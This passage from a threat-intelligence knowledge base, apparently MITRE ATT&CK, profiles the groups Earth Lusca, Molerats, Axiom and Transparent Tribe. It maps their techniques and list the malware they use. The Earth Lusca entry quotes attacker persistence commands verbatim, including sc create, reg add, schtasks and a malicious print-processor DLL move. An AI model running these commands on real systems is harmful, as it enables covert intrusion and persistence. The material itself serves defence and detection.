"content": " Earth Lusca Earth Lusca is a suspected China-based cyber espionage group that has been active since at least April 2019. Earth Lusca has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some Earth Lusca operations may be financially motivated.[1] Earth Lusca has used malware commonly used by other Chinese threat groups, including APT41 and the Winnti Group cluster, however security researchers assess Earth Lusca's techniques and infrastructure are separate.[1] ID: G1006 \u24d8 Associated Groups: TAG-22, Charcoal Typhoon, CHROMIUM, ControlX Version: 2.0 Created: 01 July 2022 Last Modified: 16 September 2024 Version Permalink Live Version Associated Group Descriptions Name Description TAG-22 [2] Charcoal Typhoon [3] CHROMIUM [3] [4] ControlX [3] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges.[1] Enterprise T1098 .004 Account Manipulation: SSH Authorized Keys Earth Lusca has dropped an SSH-authorized key in the /root/.ssh folder in order to access a compromised server with SSH.[1] Enterprise T1583 .001 Acquire Infrastructure: Domains Earth Lusca has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks.[1] .004 Acquire Infrastructure: Server Earth Lusca has acquired multiple servers for some of their operations, using each server for a different role.[1] .006 Acquire Infrastructure: Web Services Earth Lusca has established GitHub accounts to host their malware.[1] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Earth Lusca has scanned for vulnerabilities in the public-facing servers of their targets.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Earth Lusca has used WinRAR to compress stolen files into an archive prior to exfiltration.[1] Enterprise T1547 .012 Boot or Logon Autostart Execution: Print Processors Earth Lusca has added the Registry key HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint\" /v Driver /d \"spool.dll /f to load malware as a Print Processor.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Earth Lusca has used PowerShell to execute commands.[1] .005 Command and Scripting Interpreter: Visual Basic Earth Lusca used VBA scripts.[1] .006 Command and Scripting Interpreter: Python Earth Lusca used Python scripts for port scanning or building reverse shells.[1] .007 Command and Scripting Interpreter: JavaScript Earth Lusca has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations.[1] Enterprise T1584 .004 Compromise Infrastructure: Server Earth Lusca has used compromised web servers as part of their operational infrastructure.[1] .006 Compromise Infrastructure: Web Services Earth Lusca has compromised Google Drive repositories.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service Earth Lusca created a service using the command sc create \"SysUpdate\" binpath= \"cmd /c start \"[file path]\"\"&&sc config \"SysUpdate\" start= auto&&netstart SysUpdate for persistence.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Earth Lusca has used certutil to decode a string into a cabinet file.[1] Enterprise T1482 Domain Trust Discovery Earth Lusca has used Nltest to obtain information about domain controllers.[1] Enterprise T1189 Drive-by Compromise Earth Lusca has performed watering hole attacks.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA.[1] Enterprise T1190 Exploit Public-Facing Application Earth Lusca has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish.[1] Enterprise T1210 Exploitation of Remote Services Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Earth Lusca has placed a malicious payload in %WINDIR%\\SYSTEM32\\oci.dll so it would be sideloaded by the MSDTC service.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Earth Lusca used the command move [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.[1] Enterprise T1112 Modify Registry Earth Lusca modified the registry using the command reg add \"HKEY_CURRENT_USER\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"[file path]\" for persistence.[1] Enterprise T1027 Obfuscated Files or Information Earth Lusca used Base64 to encode strings.[1] .003 Steganography Earth Lusca has used steganography to hide shellcode in a BMP image file.[1] Enterprise T1588 .001 Obtain Capabilities: Malware Earth Lusca has acquired and used a variety of malware, including Cobalt Strike.[1] .002 Obtain Capabilities: Tool Earth Lusca has acquired and used a variety of open source tools.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Earth Lusca has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.[1] .006 OS Credential Dumping: DCSync Earth Lusca has used a DCSync command with Mimikatz to retrieve credentials from an exploited controller.[1] Enterprise T1566 .002 Phishing: Spearphishing Link Earth Lusca has sent spearphishing emails to potential targets that contained a malicious link.[1] Enterprise T1057 Process Discovery Earth Lusca has used Tasklist to obtain information from a compromised host.[1] Enterprise T1090 Proxy Earth Lusca adopted Cloudflare as a proxy for compromised servers.[1] Enterprise T1018 Remote System Discovery Earth Lusca used the command powershell \"Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr \"Address\"\" to find the network information of successfully logged-in accounts to discovery addresses of other machines. Earth Lusca has also used multiple scanning tools to discover other machines within the same compromised network.[1] Enterprise T1053 Scheduled Task/Job Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware Earth Lusca has staged malware and malicious files on compromised web servers, GitHub, and Google Drive.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta Earth Lusca has used mshta.exe to load an HTA script within a malicious .LNK file.[1] Enterprise T1016 System Network Configuration Discovery Earth Lusca used the command ipconfig to obtain information about network configurations.[1] Enterprise T1049 System Network Connections Discovery Earth Lusca employed a PowerShell script called RDPConnectionParser to read and filter the Windows event log \"Microsoft-Windows-TerminalServices-RDPClient/Operational\"(Event ID 1024) to obtain network information from RDP connections. Earth Lusca has also used netstat from a compromised system to obtain network connection information.[1] Enterprise T1033 System Owner/User Discovery Earth Lusca collected information on user accounts via the whoami command.[1] Enterprise T1007 System Service Discovery Earth Lusca has used Tasklist to obtain information from a compromised host.[1] Enterprise T1204 .001 User Execution: Malicious Link Earth Lusca has sent spearphishing emails that required the user to click on a malicious link and subsequently open a decoy document with a malicious loader.[1] .002 User Execution: Malicious File Earth Lusca required users to click on a malicious file for the loader to activate.[1] Enterprise T1047 Windows Management Instrumentation Earth Lusca used a VBA script to execute WMI.[1] Software ID Name References Techniques S0160 certutil [1] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0154 Cobalt Strike [1] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0590 NBTscan [1] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0359 Nltest [1] Domain Trust Discovery, Remote System Discovery, System Network Configuration Discovery S0194 PowerSploit [1] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0596 ShadowPad [1] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S0057 Tasklist [1] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S0430 Winnti for Linux [1] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Rootkit, Traffic Signaling References Chen, J., et al. (2022). Delving Deep: An Analysis of Earth Lusca\u2019s Operations. Retrieved July 1, 2022. INSIKT GROUP. (2021, July 8). Chinese State-Sponsored Activity Group TAG-22 Targets Nepal, the Philippines, and Taiwan Using Winnti and Other Tooling. Retrieved September 16, 2024. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Insikt Group. (2023, August 8). RedHotel: A Prolific, Chinese State-Sponsored Group Operating at a Global Scale. Retrieved March 11, 2024. "
},
{
"id": 214,
"title": "Molerats, Operation Molerats, Gaza Cybergang, Group G0021",
"path": "/groups/G0021/index.html",
"content": " Molerats Molerats is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.[1][2][3][4] ID: G0021 \u24d8 Associated Groups: Operation Molerats, Gaza Cybergang Version: 2.1 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Operation Molerats [5][4] Gaza Cybergang [1][3][4] Techniques Used Domain ID Name Use Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Molerats saved malicious files within the AppData and Startup folders to maintain persistence.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Molerats used PowerShell implants on target machines.[3] .005 Command and Scripting Interpreter: Visual Basic Molerats used various implants, including those built with VBScript, on target machines.[3][6] .007 Command and Scripting Interpreter: JavaScript Molerats used various implants, including those built with JS, on target machines.[3] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Molerats decompresses ZIP files once on the victim machine.[3] Enterprise T1105 Ingress Tool Transfer Molerats used executables to download malicious files from different sources.[3][6] Enterprise T1027 .015 Obfuscated Files or Information: Compression Molerats has delivered compressed executables within ZIP files to victims.[3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Molerats has sent phishing emails with malicious Microsoft Word and PDF attachments.[3][6][4] .002 Phishing: Spearphishing Link Molerats has sent phishing emails with malicious links included.[3] Enterprise T1057 Process Discovery Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Molerats has created scheduled tasks to persistently run VBScripts.[6] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Molerats has used forged Microsoft code-signing certificates on malware.[5] Enterprise T1218 .007 System Binary Proxy Execution: Msiexec Molerats has used msiexec.exe to execute an MSI payload.[6] Enterprise T1204 .001 User Execution: Malicious Link Molerats has sent malicious links via email trick users into opening a RAR archive and running an executable.[3][6] .002 User Execution: Malicious File Molerats has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.[3][6][4] Software ID Name References Techniques S0547 DropBook [4] Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Exfiltration Over Web Service, File and Directory Discovery, Ingress Tool Transfer, System Information Discovery, System Location Discovery: System Language Discovery, Web Service S0062 DustySky [1][2][3] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Fallback Channels, File and Directory Discovery, Indicator Removal: File Deletion, Input Capture: Keylogging, Lateral Tool Transfer, Obfuscated Files or Information, Peripheral Device Discovery, Process Discovery, Replication Through Removable Media, Screen Capture, Software Discovery, Software Discovery: Security Software Discovery, System Information Discovery, Windows Management Instrumentation S0553 MoleNet [4] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Ingress Tool Transfer, Software Discovery: Security Software Discovery, System Information Discovery, Windows Management Instrumentation S0012 PoisonIvy [1][2][5] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0546 SharpStage [4] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Location Discovery: System Language Discovery, Web Service, Windows Management Instrumentation S0543 Spark [6] [4] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, Obfuscated Files or Information: Software Packing, System Information Discovery, System Location Discovery: System Language Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: User Activity Based Checks References ClearSky. (2016, January 7). Operation DustySky. Retrieved January 8, 2016. ClearSky Cybersecurity. (2016, June 9). Operation DustySky - Part 2. Retrieved August 3, 2016. GReAT. (2019, April 10). Gaza Cybergang Group1, operation SneakyPastes. Retrieved May 13, 2020. Cybereason Nocturnus Team. (2020, December 9). MOLERATS IN THE CLOUD: New Malware Arsenal Abuses Cloud Platforms in Middle East Espionage Campaign. Retrieved December 22, 2020. Villeneuve, N., Haq, H., Moran, N. (2013, August 23). OPERATION MOLERATS: MIDDLE EAST CYBER ATTACKS USING POISON IVY. Retrieved November 17, 2024. Falcone, R., et al. (2020, March 3). Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations. Retrieved December 14, 2020. "
},
{
"id": 215,
"title": "Axiom, Group 72, Group G0001",
"path": "/groups/G0001/index.html",
"content": " Axiom Axiom is a suspected Chinese cyber espionage group that has targeted the aerospace, defense, government, manufacturing, and media sectors since at least 2008. Some reporting suggests a degree of overlap between Axiom and Winnti Group but the two groups appear to be distinct based on differences in reporting on TTPs and targeting.[1][2][3] ID: G0001 \u24d8 Associated Groups: Group 72 Version: 2.0 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Group 72 [4] Techniques Used Domain ID Name Use Enterprise T1583 .002 Acquire Infrastructure: DNS Server Axiom has acquired dynamic DNS services for use in the targeting of intended victims.[5] .003 Acquire Infrastructure: Virtual Private Server Axiom has used VPS hosting providers in targeting of intended victims.[5] Enterprise T1560 Archive Collected Data Axiom has compressed and encrypted data prior to exfiltration.[5] Enterprise T1584 .005 Compromise Infrastructure: Botnet Axiom has used large groups of compromised machines for use as proxy nodes.[5] Enterprise T1005 Data from Local System Axiom has collected data from a compromised network.[5] Enterprise T1001 .002 Data Obfuscation: Steganography Axiom has used steganography to hide its C2 communications.[5] Enterprise T1189 Drive-by Compromise Axiom has used watering hole attacks to gain access.[4] Enterprise T1546 .008 Event Triggered Execution: Accessibility Features Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.[5] Enterprise T1190 Exploit Public-Facing Application Axiom has been observed using SQL injection to gain access to systems.[5][4] Enterprise T1203 Exploitation for Client Execution Axiom has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.[4] Enterprise T1003 OS Credential Dumping Axiom has been known to dump credentials.[5] Enterprise T1566 Phishing Axiom has used spear phishing to initially compromise victims.[4][5] Enterprise T1563 .002 Remote Service Session Hijacking: RDP Hijacking Axiom has targeted victims with remote administration tools including RDP.[5] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Axiom has used RDP during operations.[5] Enterprise T1553 Subvert Trust Controls Axiom has used digital certificates to deliver malware.[5] Enterprise T1078 Valid Accounts Axiom has used previously compromised administrative accounts to escalate privileges.[5] Software ID Name References Techniques S0021 Derusbi [5][4] Audio Capture, Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Input Capture: Keylogging, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Screen Capture, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Owner/User Discovery, Video Capture S0032 gh0st RAT [4][5] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0009 Hikit [5][4] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hijack Execution Flow: DLL, Ingress Tool Transfer, Phishing, Proxy: Internal Proxy, Rootkit, Subvert Trust Controls: Code Signing Policy Modification, Subvert Trust Controls: Install Root Certificate S0203 Hydraq [5][4] Access Token Manipulation, Create or Modify System Process: Windows Service, Data from Local System, Encrypted Channel: Symmetric Cryptography, Exfiltration Over Alternative Protocol, File and Directory Discovery, Indicator Removal: File Deletion, Indicator Removal: Clear Windows Event Logs, Ingress Tool Transfer, Modify Registry, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, Shared Modules, System Information Discovery, System Network Configuration Discovery, System Service Discovery, System Services: Service Execution S0013 PlugX [4][5] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0012 PoisonIvy [4][5] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0672 Zox [5] Data from Local System, Data Obfuscation: Steganography, Exploitation for Privilege Escalation, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Remote Services: SMB/Windows Admin Shares, System Information Discovery S0412 ZxShell [6][4] Access Token Manipulation: Create Process with Token, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, Command and Scripting Interpreter: Windows Command Shell, Create Account: Local Account, Create or Modify System Process: Windows Service, Data from Local System, Endpoint Denial of Service, Exploit Public-Facing Application, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Credential API Hooking, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy, Query Registry, Remote Services: VNC, Remote Services: Remote Desktop Protocol, Screen Capture, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, System Service Discovery, System Services: Service Execution, Video Capture References Kaspersky Lab's Global Research and Analysis Team. (2013, April 11). Winnti. More than just a game. Retrieved February 8, 2017. Tarakanov, D. (2015, June 22). Games are over: Winnti is now targeting pharmaceutical companies. Retrieved January 14, 2016. Novetta Threat Research Group. (2015, April 7). Winnti Analysis. Retrieved February 8, 2017. Esler, J., Lee, M., and Williams, C. (2014, October 14). Threat Spotlight: Group 72. Retrieved January 14, 2016. Novetta. (n.d.). Operation SMN: Axiom Threat Actor Group Report. Retrieved November 12, 2014. Allievi, A., et al. (2014, October 28). Threat Spotlight: Group 72, Opening the ZxShell. Retrieved September 24, 2019. "
},
{
"id": 216,
"title": "Transparent Tribe, COPPER FIELDSTONE, APT36, Mythic Leopard, ProjectM, Group G0134",
"path": "/groups/G0134/index.html",
"content": " Transparent Tribe Transparent Tribe is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan.[1][2][3] ID: G0134 \u24d8 Associated Groups: COPPER FIELDSTONE, APT36, Mythic Leopard, ProjectM Contributors: Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Hiroki Nagahama, NEC Corporation Version: 1.2 Created: 02 September 2021 Last Modified: 10 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description COPPER FIELDSTONE [4] APT36 [3] Mythic Leopard [5][2][3] ProjectM [6][2] Campaigns ID Name First Seen Last Seen References Techniques C0011 C0011 December 2021 [7] July 2022 [7] [7] Acquire Infrastructure: Domains, Command and Scripting Interpreter: Visual Basic, Develop Capabilities: Digital Certificates, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Stage Capabilities: Upload Malware, User Execution: Malicious Link, User Execution: Malicious File Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.[1][3] For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India.[7] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic Transparent Tribe has crafted VBS-based malicious documents.[1][2] For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.[7] Enterprise T1584 .001 Compromise Infrastructure: Domains Transparent Tribe has compromised domains for use in targeted malicious campaigns.[1] Enterprise T1587 .003 Develop Capabilities: Digital Certificates For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered.[7] Enterprise T1189 Drive-by Compromise Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.[1][6][3] Enterprise T1568 Dynamic Resolution Transparent Tribe has used dynamic DNS services to set up C2.[1] Enterprise T1203 Exploitation for Client Execution Transparent Tribe has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.[1] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Transparent Tribe can mimic legitimate Windows directories by using the same icons and names.[2] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Transparent Tribe has dropped encoded executables on compromised hosts.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads.[1][2][8][3][6] During C0011, Transparent Tribe sent malicious attachments via email to student targets in India.[7] .002 Phishing: Spearphishing Link Transparent Tribe has embedded links to malicious downloads in e-mails.[8][3] During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India.[7] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0011, Transparent Tribe hosted malicious documents on domains registered by the group.[7] .004 Stage Capabilities: Drive-by Target Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.[1][6][3] Enterprise T1204 .001 User Execution: Malicious Link Transparent Tribe has directed users to open URLs hosting malicious content.[8][3] During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email.[7] .002 User Execution: Malicious File Transparent Tribe has used weaponized documents in e-mail to compromise targeted systems.[1][2][8][3][6] During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email.[7] Software ID Name References Techniques S0115 Crimson [1][7] Application Layer Protocol: Web Protocols, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data from Local System, Data from Removable Media, Deobfuscate/Decode Files or Information, Email Collection: Local Email Collection, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Peripheral Device Discovery, Process Discovery, Query Registry, Replication Through Removable Media, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery, Video Capture, Virtualization/Sandbox Evasion: Time Based Evasion S0334 DarkComet [6] Application Layer Protocol: Web Protocols, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter, Command and Scripting Interpreter: Windows Command Shell, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Obfuscated Files or Information: Software Packing, Process Discovery, Remote Services: Remote Desktop Protocol, System Information Discovery, System Owner/User Discovery, Video Capture S0385 njRAT [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair 